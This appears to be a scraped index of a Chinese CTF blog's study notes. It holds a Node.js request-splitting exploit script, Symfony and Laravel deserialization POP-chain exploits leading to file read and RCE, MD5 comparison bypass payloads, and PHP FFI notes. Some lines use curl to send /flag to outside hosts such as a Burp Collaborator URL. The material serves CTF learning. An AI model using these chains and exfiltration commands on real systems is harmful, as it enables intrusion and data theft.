payload.replace(\u0026#34;\\n\u0026#34;,\u0026#34;%C4%8D%C4%8A\u0026#34;) payload = payload.replace(\u0026#34;\\\u0026#34;\u0026#34;,\u0026#34;%C4%A2\u0026#34;) payload = payload.replace(\u0026#34;\u0026#39;\u0026#34;,\u0026#34;%C4%A7\u0026#34;) payload = payload.replace(\u0026#34;`\u0026#34;,\u0026#34;%C5%A0\u0026#34;) payload = payload.replace(\u0026#34;!\u0026#34;,\u0026#34;%C4%A1\u0026#34;) payload = payload.replace(\u0026#34;+\u0026#34;,\u0026#34;%2B\u0026#34;) payload = payload.replace(\u0026#34;;\u0026#34;,\u0026#34;%3B\u0026#34;) payload = payload.replace(\u0026#34;\u0026amp;\u0026#34;,\u0026#34;%26\u0026#34;) # Bypass Waf payload = payload.replace(\u0026#34;global\u0026#34;,\u0026#34;%C5%A7%C5%AC%C5%AF%C5%A2%C5%A1%C5%AC\u0026#34;) payload = payload.replace(\u0026#34;process\u0026#34;,\u0026#34;%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3\u0026#34;) payload = payload.replace(\u0026#34;mainModule\u0026#34;,\u0026#34;%C5%AD%C5%A1%C5%A9%C5%AE%C5%8D%C5%AF%C5%A4%C5%B5%C5%AC%C5%A5\u0026#34;) payload = payload.replace(\u0026#34;require\u0026#34;,\u0026#34;%C5%B2%C5%A5%C5%B1%C5%B5%C5%A9%C5%B2%C5%A5\u0026#34;) payload = payload.replace(\u0026#34;root\u0026#34;,\u0026#34;%C5%B2%C5%AF%C5%AF%C5%B4\u0026#34;) payload = payload.replace(\u0026#34;child_process\u0026#34;,\u0026#34;%C5%A3%C5%A8%C5%A9%C5%AC%C5%A4%C5%9F%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3\u0026#34;) payload = payload.replace(\u0026#34;exec\u0026#34;,\u0026#34;%C5%A5%C5%B8%C5%A5%C5%A3\u0026#34;) return payload def run(url,cmd): payloadC = payloadRaw.replace(\u0026#34;evalcmd\u0026#34;,cmd) urlC = url+\u0026#34;/core?q=\u0026#34;+getParm(payloadC) requests.get(urlC) requests.get(url+\u0026#34;/?action=5am3_get_flag\u0026#34;).text if __name__ == \u0026#39;__main__\u0026#39;: targetUrl = sys.argv[1] cmd = sys.argv[2] print run(targetUrl,cmd) # python exp.py http://127.0.0.1:8081 \u0026#34;curl eval.com -X POST -d `cat /flag.txt`\u0026#34; 实不相瞒，我被部分编码时应该编哪一些这个问题困扰了一天，经历了n次的环境崩溃和好多好多令人无语的情况；其实用全编码就是最简单快捷的，但是还是想自己折腾一下\n这个系列下一篇应该是HTTP请求走私或者是302跳转ssrf相关的，不过近期应该是不会再碰js了，垃圾Node.js，毁我青春\n以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（ CAPEC-220: Client-Server Protocol Manipulation | CAPEC-105: HTTP Request Splitting | CAPEC-33: HTTP Request Smuggling\nhttp: add \u0026ndash;security-revert for CVE-2018-12116\nSecurity Bugs in Practice: SSRF via Request Splitting\nA New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!\nMembershop - docker | Split second - docker | Node Game - docker\nProxy-Proxy - wp | Membershop - wp | Split second - wp1 | Split second - wp2 | Split second - wp3 | Node Game - wp\n","date":"2021-12-07T02:24:15+08:00","permalink":"https://amiaaaz.github.io/2021/12/07/http-request-splitting-attack-study-notes/","section":"posts","tags":["SSRF","Node.js"],"title":"HTTP请求切分攻击学习笔记"},{"categories":["NOTES\u0026SUMMARY"],"contents":"亲自从头到尾跟了一下涉及到的三个链子，稍微拯救了一点点点点我稀烂的代码审计能力\n参考链接放在文末\n链子1 - 文件包含/任意文件读取 搜索__desturct()找入手点， vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.php\n它调用了commit()和invalidateTags()\n调用pool的saveDeferred()方法，我们在这个类相同命名空间(Symfony\\Component\\Cache\\Adapter)下找有没有别的类也实现了这个方法，另外开始的那个pool是在Adapter接口下，所以要找一个AdapterInterface接口并且存在saveDeferred()的类\n找到这里vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/PhpArrayAdapter.php\n它又调用了initialize()，跟进 vendor/symfony/symfony/src/Symfony/Component/Cache/Traits/PhpArrayTrait.php\n是我们的文件包含点了，可以从这里读flag\n接下来就是构造exp了，要注意命名空间和接口\n前两个类都是Symfony\\Component\\Cache\\Adapter命名空间下的，但是CacheItem是Symfony\\Component\\Cache下的，所以要再引入它，use\n\u0026lt;?php namespace Symfony\\Component\\Cache{ final class CacheItem{ } } namespace Symfony\\Component\\Cache\\Adapter{ use Symfony\\Component\\Cache\\CacheItem; class PhpArrayAdapter{ private $file=\u0026#39;/flag\u0026#39;; } class TagAwareAdapter{ private $deferred; private $pool; public function __construct(){ $this-\u0026gt;deferred = array(\u0026#39;amiz\u0026#39; =\u0026gt; new CacheItem()); $this-\u0026gt;pool = new PhpArrayAdapter(); } } $a = new TagAwareAdapter(); echo urlencode(serialize($a)); } 链子2 - rce 回到前面在相同命名空间下找saveDeferred()的地方，还有另一个类也有同样的方法 vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/ProxyAdapter.php\n跟进doSave()\n223行可以动态调用函数，setInnerItem可控 我们可以调用system()，接下来确认它调用的两个参数可不可控\n对于$item，是调用函数doSave()函数时传入的参数，也就是saveDeferred()时的参数，也就是我们传入的数组，可控\n对于$innerItem有这样一个if判断\n光看这个判断肥肠的突兀，还要结合207行的$item = (array) $item;，它将一个类强行转换成数组，而后面跟着的这个if判断就是为了解决类中原有的 protected的属性冲突，所以需要在相同的命名空间里接着找一个类，包含pollHash和innerItem属性，最终还是找到了CacheItem（前面也是它\n构造exp\n\u0026lt;?php namespace Symfony\\Component\\Cache{ final class CacheItem { protected $expiry; protected $poolHash; protected $innerItem; public function __construct($expiry, $poolHash, $command) { $this-\u0026gt;expiry = $expiry; $this-\u0026gt;poolHash = $poolHash; $this-\u0026gt;innerItem = $command; } } } namespace Symfony\\Component\\Cache\\Adapter{ class ProxyAdapter { private $poolHash; private $setInnerItem; public function __construct($poolHash, $func) { $this-\u0026gt;poolHash = $poolHash; $this-\u0026gt;setInnerItem = $func; } } class TagAwareAdapter { private $deferred = []; private $pool; public function __construct($deferred, $pool) { $this-\u0026gt;deferred = $deferred; $this-\u0026gt;pool = $pool; } } } namespace { $cacheitem = new Symfony\\Component\\Cache\\CacheItem(1,1,\u0026#34;dir\u0026#34;); $proxyadapter = new Symfony\\Component\\Cache\\Adapter\\ProxyAdapter(1,\u0026#39;system\u0026#39;); $tagawareadapter = new Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter(array($cacheitem),$proxyadapter); echo urlencode(serialize($tagawareadapter)); } 本地尝试一下（懒得再开靶机了w\n成功了捏\n链子3 - rce 在 [CISCN2019 总决赛 Day1 Web4]Laravel1这道题里赵师傅把这条路堵死了，但是本地复现无所谓啦\n把这个注释取消即可\n看到它调用了events的dispatch方法，跟上面思路一样，接着找一个可用的别的类里的dispatch，比如vendor/laravel/framework/src/Illuminate/Bus/Dispatcher.php\n看一下第一个判断的返回时调用的dispatchNow()是什么\n150行有亮点啊，使用了call_user_func，第一个参数可控，第二个参数来自$command，也就是最开始找的析构函数调用的$this-\u0026gt;event；现在要找一个类 可以执行任意函数作为第一个参数，然后我们的rce命令作为第二个参数传入，完成整个链子\n不过先不急，首先要满足dispatch()中的if判断$this-\u0026gt;queueResolver \u0026amp;\u0026amp; $this-\u0026gt;commandShouldBeQueued($command)，前一个可控，看看后面这个\n需要$command必须是一个实现了ShouldQueue接口的类，找到这个 vendor/laravel/framework/src/Illuminate/Foundation/Console/QueuedCommand.php\n然后接着找适合做call_user_func()第一个参数的类，它需要可以执行任意函数 vendor/mockery/mockery/library/Mockery/Loader/EvalLoader.php\n这个load()可以直接调用eval执行代码，但是$defination要满足if的判断，跟进\n需要额外再找两个类，第一个类具有code属性，第二类又getName函数，来作为第一个类的config属性\n可用的第一个类就是getClassName()所在的类 vendor/mockery/mockery/library/Mockery/Generator/MockDefinition.php\n第二个是 vendor/nikic/php-parser/lib/PhpParser/Node/Scalar/MagicConst/Line.php\n总结以上的过程，写exp\n\u0026lt;?php namespace PhpParser\\Node\\Scalar\\MagicConst{ class Line {} } namespace Mockery\\Generator{ class MockDefinition { protected $config; protected $code; public function __construct($config, $code) { $this-\u0026gt;config = $config; $this-\u0026gt;code = $code; } } } namespace Mockery\\Loader{ class EvalLoader{} } namespace Illuminate\\Bus{ class Dispatcher { protected $queueResolver; public function __construct($queueResolver) { $this-\u0026gt;queueResolver = $queueResolver; } } } namespace Illuminate\\Foundation\\Console{ class QueuedCommand { public $connection; public function __construct($connection) { $this-\u0026gt;connection = $connection; } } } namespace Illuminate\\Broadcasting{ class PendingBroadcast { protected $events; protected $event; public function __construct($events, $event) { $this-\u0026gt;events = $events; $this-\u0026gt;event = $event; } } } namespace{ $line = new PhpParser\\Node\\Scalar\\MagicConst\\Line(); $mockdefinition = new Mockery\\Generator\\MockDefinition($line,\u0026#39;\u0026lt;?php phpinfo();?\u0026gt;\u0026#39;); $evalloader = new Mockery\\Loader\\EvalLoader(); $dispatcher = new Illuminate\\Bus\\Dispatcher(array($evalloader,\u0026#39;load\u0026#39;)); $queuedcommand = new Illuminate\\Foundation\\Console\\QueuedCommand($mockdefinition); $pendingbroadcast = new Illuminate\\Broadcasting\\PendingBroadcast($dispatcher,$queuedcommand); echo urlencode(serialize($pendingbroadcast)); } ?\u0026gt; 执行效果（盖了一层laravel报错的底色哈哈哈哈哈哈哈\n这个链子非常的长，涉及到6个类\npop链杀我！！！看代码有种目害的感觉了\n以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（ Laravel POP链简析 | Laravel5.8.x反序列化POP链\n","date":"2021-12-04T14:11:02+08:00","permalink":"https://amiaaaz.github.io/2021/12/04/laravel-5.8.x-pop-gadgets/","section":"posts","tags":["PHP","unserialize","laravel","gadget"],"title":"Laravel-5.8.x反序列化pop链学习"},{"categories":["NOTES\u0026SUMMARY"],"contents":" 写在开头：\n别纠结\n左侧的符号反转\u0026amp;标题是中文引号\u0026amp;有些符号消失\n的问题\n我也很无语\n寄。\nmd5(array()) = md5(NULL) = d41d8cd98f00b204e9800998ecf8427e sha1绕过和md5绕过方式是一样的\nmd5($a)==md5($b) \u0026amp;\u0026amp; $a!=$b 数组绕过\n?a[]=1\u0026amp;b[]=2 0e绕过\nIHKFRNS -\u0026gt; 0e256160682445802696926137988570 QLTHNDT -\u0026gt; 0e405967825401955372549139051580 QNKCDZO -\u0026gt; 0e830400451993494058024219903391 3908336290 -\u0026gt; 0e807624498959190415881248245271 4011627063 -\u0026gt; 0e485805687034439905938362701775 4775635065 -\u0026gt; 0e998212089946640967599450361168 0e215962017 -\u0026gt; 0e291242476940776845150308577824 aabg7XSs -\u0026gt; 0e087386482136013740957780965295 aabC9RqS -\u0026gt; 0e041022518165728065344349536299 0e251288019 -\u0026gt; 0e874956163641961271069404332409 240610708 -\u0026gt; 0e462097431906509019562988736854 md5碰撞\na=%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%16%B4%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%DC%9F%95ab%D2%09P%A1%5D%12%3B%1ETZ%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF/a%DE%27%29%EF%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%1E%7Ch%B0%96%A7%E5U%EBn1q%CA%D0%8B%C7%1BSP b=%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%164%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%5C%A0%95ab%D2%09P%A1%5D%12%3B%1ET%DA%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF/a%DE%27%29o%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%9E%7Bh%B0%96%A7%E5U%EBn1q%CA%D0%0B%C7%1BSP md5($a)==md5(md5($b)) \u0026amp;\u0026amp; $a!=$b 数组绕过\na=\u0026amp;b[]=1 md5((string)$_GET[\u0026lsquo;a\u0026rsquo;])==md5(md5((string)$_GET[\u0026lsquo;b\u0026rsquo;])) \u0026amp;\u0026amp; $a!=$b 0e绕过，一个是正常0e，一个是第二次md5后还为0e的奇葩值\naawBzC aabsbm9 aaaabGG5T aaaabKGVH md5($a)==md5($b) \u0026amp;\u0026amp; !ctype_alpha($a) \u0026amp;\u0026amp; !is_numeric($b) 0e绕过，一个纯数字一个纯字母\n240610708 -\u0026gt; 0e462097431906509019562988736854 QNKCDZO -\u0026gt; 0e830400451993494058024219903391 md5($a)===md5($b) \u0026amp;\u0026amp; $a!=$b 数组绕过\n?a[]=1\u0026amp;b[]=2 md5($a)===md5(md5($b)) \u0026amp;\u0026amp; $a!=$b 数组绕过\n?a[]=1\u0026amp;b[]=2 md5($a)===md5($b) \u0026amp;\u0026amp; $a!==$b 数组绕过\n?a[]=1\u0026amp;b[]=2 $a!=hash(\u0026ldquo;md4\u0026rdquo;,$a) 0e纯数字绕过\n\u0026lt;?php for ($i = 0; ; $i++) { $r = \u0026#34;0e\u0026#34; . $i; $md4 = hash(\u0026#34;md4\u0026#34;, $r); if (preg_match(\u0026#34;/^0e[0-9]*$/\u0026#34;, $md4)) { echo (\u0026#34;md4加密前:\u0026#34;.$r).\u0026#34;\\n\u0026#34;; echo(\u0026#34;md4加密后：\u0026#34;.$md4); break; } } 0e251288019 -\u0026gt; 0e874956163641961271069404332409 md5($a)===md5($b) \u0026amp;\u0026amp; $a!==$b \u0026amp;\u0026amp; strlen($a)\u0026lt;=3 \u0026amp;\u0026amp; strlen($b)\u0026lt;=3 INF表示无穷大，而NAN表示一个在浮点数运算中未定义或不可表述的值；除了与True之外，拿NAN与其他任何值进行松散比较或者严格比较返回结果都是FALSE 因为他们都是不确定的值，所以在与自身做比较时，会返回false\nINF和NAN绕过\na=INF\u0026amp;b=INF a=NAN\u0026amp;b=NAN ($this-\u0026gt;syc != $this-\u0026gt;lover) \u0026amp;\u0026amp; (md5($this-\u0026gt;syc) === md5($this-\u0026gt;lover)) \u0026amp;\u0026amp; (sha1($this-\u0026gt;syc)=== sha1($this-\u0026gt;lover)) 做题遇到的\n用原生类Error（php7）或Exception（php5 or 7），它有__toString方法，被触发后会以字符串形式输出当前保存情况，包括错误信息和当前报错的行号，而跟传入的参数没有关系；所以说可以构造两个类的实例，它们行号相同（被__toString调用后输出信息一样），但是本身不相同（传入参数不等）\n$str = \u0026#34;?\u0026gt;\u0026lt;?=include~\u0026#34;.urldecode(urlencode(~\u0026#39;/flag\u0026#39;)).\u0026#34;?\u0026gt;\u0026#34;;\t// 这个不重要 是那个题的payload $a=new Error($str,1);$b=new Error($str,2); $c = new SYCLOVER(); $c-\u0026gt;syc = $a; $c-\u0026gt;lover = $b; 注意$a和$b写到一行\n$this-\u0026gt;token === $this-\u0026gt;token_flag 指针取地址绕过\n$F-\u0026gt;token=\u0026amp;$F-\u0026gt;token_flag; ","date":"2021-12-03T00:24:56+08:00","permalink":"https://amiaaaz.github.io/2021/12/03/bypass-md5-or-sha1-compare/","section":"posts","tags":["md5"],"title":"md5比较常见绕过小结"},{"categories":["NOTES\u0026SUMMARY"],"contents":"废话不多说，直接进入正题；文中参考链接统一扔后面了\nPreloading PHP RFC: Preloading | php7.4启用 预加载文件到opcache中，类不能有不可达的父类、接口，also only top-level entities are not nested with control structures (e.g. if()\u0026hellip;)may be preloaded；被加载后除非重启，进行的修改不影响当前进程；预加载不影响静态类成员和变量的表现；Windows中不能预加载从内部继承的类（Windows ASLR and absence of fork() don\u0026rsquo;t allow to guarantee the same addresses of internal classes in different processes.）；多版本有可能造成bug\nFFI PHP RFC: FFI - Foreign Function Interface | php7.4启用 文档中给了一个小栗子\n\u0026lt;?php // create FFI object, loading libc and exporting function printf() $ffi = FFI::cdef( \u0026#34;int printf(const char *format, ...);\u0026#34;, // this is regular C declaration \u0026#34;libc.so.6\u0026#34;); // call C printf() $ffi-\u0026gt;printf(\u0026#34;Hello %s!\\n\u0026#34;, \u0026#34;world\u0026#34;); 直接运行即可输出Hello world!；这个函数的原型是这样的\nFFI::cdef([string $cdef = \u0026#34;\u0026#34; [, string $lib = null]]): FFI 书写的形式相当的简洁，创建FFI对象（声明）-\u0026gt;调用c方法；试着直接执行一个whoami\nphp -r \u0026#39;$ffi = FFI::cdef(\u0026#34;int system(char *command);\u0026#34;);$ffi-\u0026gt;system(\u0026#34;whoami\u0026#34;);\u0026#39; 发现在没有第二个参数的情况下也可以正常执行system函数，看下源码\n这种情况下lib=NULL，handle=RTLD_DEFAULT（这个注释TODO就很灵性）\n随后调用DL_FETCH_SYMBOL，也就是dlsysm\nRTLD_DEFAULT\nFind the first occurrence of the desired symbol using the default shared object search order. The search will include global symbols in the executable and its dependencies, as well as symbols in shared objects that were dynamically loaded with the RTLD_GLOBALflag.\n当dlsym第一个参数为RTLD_DEFAULT时，会按照默认共享库顺序查找system的位置，搜索范围还包括了可执行程序极其依赖中的函数表（如果设置了 RTLD_GLOBAL还会搜索动态加载库中的函数表），也就是直接在全局符号表里找了，所以不需要指定加载库，fopen这类函数也是一样\n更多的栗子请参见文档和这一篇文章，写的都很详细\n跑个题：FFI in Python Python的优点就不必说了，缺点是封装太好了导致运行速度上不去，那为什么不直接在Python中用C/C++呢？\n肥肠不错的想法！不过要解决的有两个问题：Marshalling（感觉编组这个翻译很奇怪 但是这个行为可以类比一下serialize） \u0026amp; Manageing Memory（内存管理）\nPython中万物皆object，而C中有严格的int float等等类型 Python有gc，而C中需要手动malloc 不过不急，已经有库封装好了这些功能可以直接使用，来康康demo\nctypes库 #include \u0026lt;stdio.h\u0026gt; float cadd(int x, float y) { float res = x + y; printf(\u0026#34;In cadd: int %d float %.1f returning %.1f\\n\u0026#34;, x, y, res); return res; } import ctypes import pathlib if __name__ == \u0026#34;__main__\u0026#34;: # load the lib libname = pathlib.Path().absolute() / \u0026#34;libcadd.so\u0026#34; c_lib = ctypes.CDLL(libname) x, y = 6, 2.3 # define the return type c_lib.cadd.restype = ctypes.c_float # call the function with the correct argument types res = c_lib.cadd(x, ctypes.c_float(y)) print(f\u0026#34;In python: int: {x} float {y:.1f} return val {res:.1f}\u0026#34;) $ gcc -shared -Wl,-soname,libcadd -o libcadd.so -fPIC cadd.c $ python3 test.py In cadd: int 6 float 2.3 returning 8.3 In python: int: 6 float 2.3 return val 8.3 可以看到成功调用了cadd.so，而我们在python中要做的只有加载.so-\u0026gt;设置符合C标准的返回值类型-\u0026gt;调用，肥肠的简单\n不过标准库ctypes有一些缺陷 并且不能拓展大型项目，鉴于此我们可以使用cffi库\ncffi库 这里是一个hello world的小demo\nfrom cffi import FFI ffi = FFI() # 可以定义函数 结构体 变量 ffi.cdef(\u0026#34;\u0026#34;\u0026#34; int printf(const char *format, ...); \u0026#34;\u0026#34;\u0026#34;) c = ffi.dlopen(None) # 加载c命名空间 arg = ffi.new(\u0026#34;char[]\u0026#34;, b\u0026#34;world\u0026#34;) # 即 char arg[]=\u0026#34;world\u0026#34;; c.printf(b\u0026#34;hello %s\\n\u0026#34;, arg) 这个栗子里直接在一个py文件中用cffi调用库函数就结束了，肥肠肥肠的简单；或者也可以和ctypes一样，单独写一个c先\n#include \u0026lt;stdio.h\u0026gt; int Tadd(int a, int b){ int c; c = a+b; return c; } void Tprint(void){ printf(\u0026#34;hello, world\\n\u0026#34;); } int Tmul(int a, int b){ return a*b; } 然后调用ffi.verify()在Python中加载和使用，不过还需要额外声明函数\nfrom cffi import FFI ffi = FFI() ffi.cdef(\u0026#34;\u0026#34;\u0026#34; int Tadd(int a, int b); void Tprint(void); int Tmul(int a, int b); \u0026#34;\u0026#34;\u0026#34;) lib = ffi.verify(sources=[\u0026#39;uu.c\u0026#39;]) print(lib.Tadd(10, 2)) lib.Tprint() print(lib.Tmul(3, 5)) 以上方式都是在线api模式，cffi还支持离线api模式，比如下面这个demo\nfrom cffi import FFI ffibuilder = FFI() ffibuilder.cdef(\u0026#34;\u0026#34;\u0026#34; double sqrt(double x); \u0026#34;\u0026#34;\u0026#34;) # 需要的头文件 ffibuilder.set_source(\u0026#34;_libmath\u0026#34;, \u0026#34;\u0026#34;\u0026#34; #include \u0026lt;math.h\u0026gt; \u0026#34;\u0026#34;\u0026#34;, library_dirs = [], libraries = [\u0026#39;m\u0026#39;] ) ffibuilder.compile(verbose=True) python build_cffi.py from _libmath import lib # 直接调用c函数 x = lib.sqrt(4.5) print(F\u0026#34;The square root of 4.5 is {x}.\u0026#34;) python test.py 可以看到这里先用一个py文件调用.h来编译生成.so和.c，然后在另一个py文件中调用.c即可\n或者还有第三种方式，在Python中使用外部已经定义好的c库函数；这里使用wolever/python-cffi-example来演示（就不复制粘贴了捏 就粘就粘\n首先是一个fnmatch.h\n注意7 8 9行要改一下的，根据/usr/include/fnmatch.h改\n这是build_fnmatch.py，用于生成模块在fnmatch.py中使用\nimport os from cffi import FFI ffi = FFI() ffi.set_source(\u0026#34;cffi_example._fnmatch\u0026#34;, # Since we are calling fnmatch directly no custom source is necessary. We # need to #include \u0026lt;fnmatch.h\u0026gt;, though, because behind the scenes cffi # generates a .c file which contains a Python-friendly wrapper around # ``fnmatch``: # static PyObject * # _cffi_f_fnmatch(PyObject *self, PyObject *args) { # ... setup ... # result = fnmatch(...); # return PyInt_FromLong(result); # } \u0026#34;#include \u0026lt;fnmatch.h\u0026gt;\u0026#34;, # The important thing is to inclue libc in the list of libraries we\u0026#39;re # linking against: libraries=[\u0026#34;c\u0026#34;], ) with open(os.path.join(os.path.dirname(__file__), \u0026#34;fnmatch.h\u0026#34;)) as f: ffi.cdef(f.read()) if __name__ == \u0026#34;__main__\u0026#34;: ffi.compile() 一个setup.py\n#!/usr/bin/env python import os import sys from setuptools import setup, find_packages os.chdir(os.path.dirname(sys.argv[0]) or \u0026#34;.\u0026#34;) setup( name=\u0026#34;cffi-example\u0026#34;, version=\u0026#34;0.1\u0026#34;, classifiers=[ \u0026#34;Development Status :: 4 - Beta\u0026#34;, \u0026#34;Programming Language :: Python :: 2\u0026#34;, \u0026#34;Programming Language :: Python :: 3\u0026#34;, \u0026#34;Programming Language :: Python :: Implementation :: PyPy\u0026#34;, \u0026#34;License :: OSI Approved :: BSD License\u0026#34;, ], packages=find_packages(), install_requires=[\u0026#34;cffi\u0026gt;=1.0.0\u0026#34;], setup_requires=[\u0026#34;cffi\u0026gt;=1.0.0\u0026#34;], cffi_modules=[ \u0026#34;./build_fnmatch.py:ffi\u0026#34;, ], ) 最后的cffi_modules指定了需要生成ffi实例的文件\npyhon setup.py install 没想到是个报错，仔细看一下原因，解决方法是把之前的fnmatch.h中的偏移换成16进制\n再次执行就好了\n可以看到这种方式比之前生成的文件都要多，相当于安装了一个模块\n然后是一个test_fnmatch.py，注意这里直接用给出的文件还是会报错，把下图高亮的地方换成0x1\n再执行就好了\ncffi和ctypes还有很多的花活，鉴于我的代码能力一般（c和python都是勉强够用的水平），就不班门弄斧了，更多的东西还是看官方文档比较靠谱（链接贴在最后了\n————什么？为什么FFI in PHP介绍的还不如FFI in Python的多？\nemmmmm 这个嘛 才不会说是因为懒呢\nSerializable PHP RFC: New custom object serialization mechanism | php7.4启用 已有的反序列化魔术方法总是有很多安全问题，这个提议新增了__serialize()，__unserialize()，serialize()，unserialize()和Serializable()\nserialize()检查到__serialize()的存在后将在序列化之前优先执行，返回序列化形式的数组，如有错抛出TypeError；如果同时有__serialize()和__sleep()，后者将被忽略；如果对象实现了Serializable()接口，接口的serialize()将被忽略，类中的__serialize()将被调用；反序列化时触发__unserialize()\n————好勾八复杂的，建议直接看文档\n[RCTF 2019]Nextphp \u0026lt;?php final class A implements Serializable { protected $data = [ \u0026#39;ret\u0026#39; =\u0026gt; null, \u0026#39;func\u0026#39; =\u0026gt; \u0026#39;print_r\u0026#39;, \u0026#39;arg\u0026#39; =\u0026gt; \u0026#39;1\u0026#39; ]; private function run () { $this-\u0026gt;data[\u0026#39;ret\u0026#39;] = $this-\u0026gt;data[\u0026#39;func\u0026#39;]($this-\u0026gt;data[\u0026#39;arg\u0026#39;]); } public function __serialize(): array { return $this-\u0026gt;data; } public function __unserialize(array $data) { array_merge($this-\u0026gt;data, $data); $this-\u0026gt;run(); } public function serialize (): string { return serialize($this-\u0026gt;data); } public function unserialize($payload) { $this-\u0026gt;data = unserialize($payload); $this-\u0026gt;run(); } public function __get ($key) { return $this-\u0026gt;data[$key]; } public function __set ($key, $value) { throw new \\Exception(\u0026#39;No implemented\u0026#39;); } public function __construct () { throw new \\Exception(\u0026#39;No implemented\u0026#39;); } } 如果熟读以上三个文档，这个题就很好出了\n我们可以把func设为FFI:cdef，arg设为int system(char *command)来执行c代码绕过php.ini中的限制；同时由于Serializable的种种新特性（出题人也在这里设了坑），我们在构造poc时要删除__serialize()，防止直接return进坑里了\n\u0026lt;?php final class A implements Serializable { protected $data = [ \u0026#39;ret\u0026#39; =\u0026gt; null, \u0026#39;func\u0026#39; =\u0026gt; \u0026#39;FFI::cdef\u0026#39;, \u0026#39;arg\u0026#39; =\u0026gt; \u0026#39;int system(char *command);\u0026#39; ]; private function run () { $this-\u0026gt;data[\u0026#39;ret\u0026#39;] = $this-\u0026gt;data[\u0026#39;func\u0026#39;]($this-\u0026gt;data[\u0026#39;arg\u0026#39;]); } public function serialize (): string { return serialize($this-\u0026gt;data); } public function __unserialize(array $data) { array_merge($this-\u0026gt;data, $data); $this-\u0026gt;run(); } public function unserialize($payload) { $this-\u0026gt;data = unserialize($payload); $this-\u0026gt;run(); } public function __get ($key) { return $this-\u0026gt;data[$key]; } public function __set ($key, $value) { throw new \\Exception(\u0026#39;No implemented\u0026#39;); } public function __construct () { echo \u0026#39;start\u0026#39;.\u0026#39;\u0026lt;/br\u0026gt;\u0026#39;; } } $a = new A(); echo base64_encode(serialize($a)); 随后在传入的地方执行unserialize(base64_decode(payload))-\u0026gt;__serialize()['ret']-\u0026gt;system(command);，直接curl外带flag\n?a=unserialize(base64_decode(QzoxOiJBIjo4OTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czoyNjoiaW50IHN5c3RlbShjaGFyICpjb21tYW5kKTsiO319))-\u0026gt;__serialize()[\u0026#39;ret\u0026#39;]-\u0026gt;system(\u0026#34;curl -d @/flag http://fm56ifsleqz363dh864mlhvtzk5atz.burpcollaborator.net\u0026#34;); ————在这个题出现之后蚁剑还专门出了对应的插件\n但是多次尝试失败，之后看到了这个wp之后再看官方文档还有这一篇就明白了\n默认情况下FFI只会被用于CLI模式下\u0026amp;预加载php脚本，除非设置ffi.enable=true，设置之后在webshell就可以直接用蚁剑插件了\n[极客大挑战 2020]Roamphp5-FighterFightsInvincibly 很漂亮的前端，看页面源码有注释的提示\n这个形式，真的是一眼create_function()了，看一下phpinfo()，用的还是create_function()的注入\n?fighter=create_function\u0026amp;fights=\u0026amp;invincibly=;}phpinfo();/* 看下disable_function\nsystem,exec,shell_exec,passthru,proc_open,proc_close,\u0026amp;nbsp;proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport,\u0026amp;nbsp;syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept,\u0026amp;nbsp;socket_connect,\u0026amp;nbsp;stream_socket_server,\u0026amp;nbsp;stream_socket_accept,stream_socket_client,ftp_connect,\u0026amp;nbsp;ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space,\u0026amp;nbsp;disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd,\u0026amp;nbsp;posix_getegid,posix_geteuid,posix_getgid,\u0026amp;nbsp;posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,\u0026amp;nbsp;posix_getppid,posix_getpwnam,posix_getpwuid,\u0026amp;nbsp;posix_getrlimit,\u0026amp;nbsp;posix_getsid,posix_getuid,posix_isatty,\u0026amp;nbsp;posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid,\u0026amp;nbsp;posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname\u0026lt;/td\u0026gt;\u0026lt;td class=\u0026#34;v\u0026#34;\u0026gt;system,exec,shell_exec,passthru,proc_open,proc_close,\u0026amp;nbsp;proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport,\u0026amp;nbsp;syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept,\u0026amp;nbsp;socket_connect,\u0026amp;nbsp;stream_socket_server,\u0026amp;nbsp;stream_socket_accept,stream_socket_client,ftp_connect,\u0026amp;nbsp;ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space,\u0026amp;nbsp;disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd,\u0026amp;nbsp;posix_getegid,posix_geteuid,posix_getgid,\u0026amp;nbsp;posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,\u0026amp;nbsp;posix_getppid,posix_getpwnam,posix_getpwuid,\u0026amp;nbsp;posix_getrlimit,\u0026amp;nbsp;posix_getsid,posix_getuid,posix_isatty,\u0026amp;nbsp;posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid,\u0026amp;nbsp;posix_setpgi